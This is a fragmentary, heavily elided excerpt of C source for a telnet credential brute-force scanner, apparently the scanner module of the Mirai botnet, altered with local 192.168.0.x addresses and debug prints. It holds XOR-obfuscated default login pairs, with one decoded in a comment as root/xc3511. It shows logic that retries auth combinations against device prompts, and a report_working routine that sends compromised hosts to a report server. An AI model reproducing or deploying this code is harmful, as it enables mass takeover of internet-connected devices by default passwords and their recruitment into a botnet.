...
void scanner_init(void)
{
...
#ifdef DEBUG   
    printf("[scanner] do while finish\n");
#endif
    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    ...
    // Set up passwords
    add_auth_entry("\x57\x40\x57\x4C\x56\x57", "\x5B\x4D\x4F\x4B\x46\x4D\x50\x43\x12\x10", 10);
    //add_auth_entry("\x57\x40\x57\x4C\x56\x57", "\x5B\x4D\x4F\x4B\x46\x4D\x50\x43\x12\x10", 10);             //add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
...
#ifdef DEBUG
        //printf("[scanner] report_working while1 start\n");
#endif
            ...
            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
                ...
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    ...
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[scanner] FD%d retrying with different auth combo2!\n", conn->fd);
#endif
                    }
                }
                else
        ...
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            ...
            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    ...
                    {
#ifdef DEBUG
                        //printf("[scanner] errno=%d  :conn->state=%d\n", errno,conn->state);
#endif
                        int consumed = 0;
                        ...
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                ...
                                int timetime;
                               /* printf("[scanner]sleep start\n");
                                clock_t a=clock(),b;
                                do{
                                    if((b=clock())==(clock_t)-1)
                                        printf("[scanner]sleep err");
                                }while(1000UL*(b-a)/CLOCKS_PER_SEC<=20000);
                                printf("[scanner]sleep finish,%d\n",timetime);*/
#endif
                            }
                            break;
                        ...
                        case SC_WAITING_TOKEN_RESP:
                            ...
                            if (consumed == -1)
                            {
                                ...
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("[scanner] FD%d retrying with different auth combo1!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
...
static ipv4_t get_random_ip(void)
{
    ...
    return INET_ADDR(192,168,0,115);//INET_ADDR(o1,o2,o3,o4);
}
...
{
#ifdef DEBUG
    printf("[scanner] consume_user_prompt errno=%d  :conn->state=%d\n", errno,conn->state);
#endif
    char *pch;
    int i, prompt_ending = -1;
    ...
    {
        #ifdef DEBUG
    printf("[scanner] consume_user_prompt break:rdbuf_pos%d\n", conn->rdbuf_pos);
#endif
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
#ifdef DEBUG
    printf("[scanner] consume_user_prompt break:conn->rdbuf[i]%s\n", conn->rdbuf[i]);
#endif
            break;
        }
    }
...
#ifdef DEBUG
    printf("[scanner] consume_user_prompt errno=%d  :conn->state=%d prompt_ending=%d\n", errno,conn->state,prompt_ending);
#endif
    if (prompt_ending == -1)
        return 0;
    else
...
{
#ifdef DEBUG
        printf("[scanner] report_working start//////////////////////////////////////////////////////////////////////////////////////////////////////////////\n");
#endif
    ...
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = (uint32_t )INET_ADDR(192,168,0,114);//entries->addrs[rand_next() % entries->addrs_len];
    addr.sin_port = 58811;//48101;//*((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
